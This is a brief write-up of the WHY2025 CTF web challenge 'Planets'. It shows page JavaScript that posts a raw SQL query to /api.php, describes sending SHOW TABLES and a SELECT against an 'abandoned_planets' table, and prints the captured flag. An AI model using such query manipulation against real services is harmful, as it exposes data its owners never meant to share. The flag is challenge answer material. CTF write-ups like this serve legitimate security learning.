-------------------

### CTF: WHY2025 CTF

-------------------

![image](https://github.com/user-attachments/assets/5d7b39c1-2e1f-48da-a494-f818560ea6d0)

-------------------

### CHALLENGES-:

-------------------

- Web-:
  - Planets
  - Festival

-------------------

### PLANETS

-------------------

![image](https://github.com/user-attachments/assets/f1fb9132-28d3-4135-a6d5-9385277c245d)

------------------

- Source Code as seen with view-source-:

```js
try {
            fetch("/api.php", {
                method: "POST",
                body: "query=SELECT * FROM planets",
                headers: {"Content-type": "application/x-www-form-urlencoded; charset=UTF-8"},
            })
            .then(response => response.json())
            .then(response => addPlanets(response))
        } catch (error) {
            console.error(error.message);
        }
```

- The code above is a js ajax request  making a post request to php page `/api.php`.The interesting part is the body which contains sql query sent to the server.We can manipulate the input to read other data from the database.

```js
 body: "query=SELECT * FROM planets"
```

- I made a query to check for other tables with `SHOW TABLES`.We have an interesting rresult `abandoned_planets`.

![image](https://github.com/user-attachments/assets/0153717f-8f47-4652-ad06-918200fe2a6e)

- The next step is to read the columns with `select * from abandoned_planets`.I got the flag with that statement.

![image](https://github.com/user-attachments/assets/17fc2858-fec1-4bf2-a46b-1ac5fe0ef5a1)

- Flag-:`flag{54de9e7dbee502cdc153cec4e0abfb38}`

